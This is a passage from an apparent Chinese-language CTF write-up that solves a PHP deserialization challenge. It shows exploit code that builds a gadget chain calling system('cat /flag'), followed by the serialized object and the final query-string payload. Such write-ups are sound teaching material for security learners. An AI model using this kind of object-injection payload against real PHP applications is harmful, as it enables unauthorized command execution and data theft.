   ```php
   StarRailCabin::$needle = "1e999"
   ```

5. 编写 exp：

   ```php
   <?php
   class StarRailCabin {
       public $crewBadge;
       public $catDoor;
       public $needle = "1e999";
       public $haystack;
   }
   
   class CatCafeGate {
       public $fortuneTeller = "QingCen::echo_name";
       public $sparkler;
   }
   
   class KleeFirework {
       public $spell = "system";
       public $scroll = "cat /flag";
   }
   
   $a = new StarRailCabin();
   $a->catDoor = new CatCafeGate();
   $a->catDoor->sparkler = new KleeFirework();
   
   echo serialize($a);
   ```

   得到：

   ```txt
   O:13:"StarRailCabin":4:{s:9:"crewBadge";N;s:7:"catDoor";O:11:"CatCafeGate":2:{s:13:"fortuneTeller";s:18:"QingCen::echo_name";s:8:"sparkler";O:12:"KleeFirework":2:{s:5:"spell";s:6:"system";s:6:"scroll";s:9:"cat /flag";}}s:6:"needle";s:5:"1e999";s:8:"haystack";N;} 
   ```

   最终 payload：

   ```http
   ?data[qc.bz2=O:13:"StarRailCabin":4:{s:9:"crewBadge";N;s:7:"catDoor";O:11:"CatCafeGate":2:{s:13:"fortuneTeller";s:18:"QingCen::echo_name";s:8:"sparkler";O:12:"KleeFirework":2:{s:5:"spell";s:6:"system";s:6:"scroll";s:9:"cat /flag";}}s:6:"needle";s:5:"1e999";s:8:"haystack";N;} 
   ```
